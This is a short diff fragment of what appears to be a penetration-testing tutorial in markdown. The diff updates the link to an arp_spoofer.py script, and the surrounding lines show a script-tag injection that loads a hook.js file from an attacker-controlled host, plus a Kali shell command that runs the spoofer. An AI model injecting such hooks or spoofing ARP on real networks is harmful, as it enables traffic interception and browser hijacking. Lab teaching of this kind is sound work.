@@ -34,7 +34,7 @@ Example:
 
 Injection code: `<script src="http://192.168.122.108:3000/hook.js"></script>`
 
-* Run the [arp_spoofer.py script](/arp_spoofer)
+* Run the [arp_spoofer.py script](/layer2/arp_spoofer)
 
 ```shell
     @kali:~$ sudo python3 arp_spoofer.py
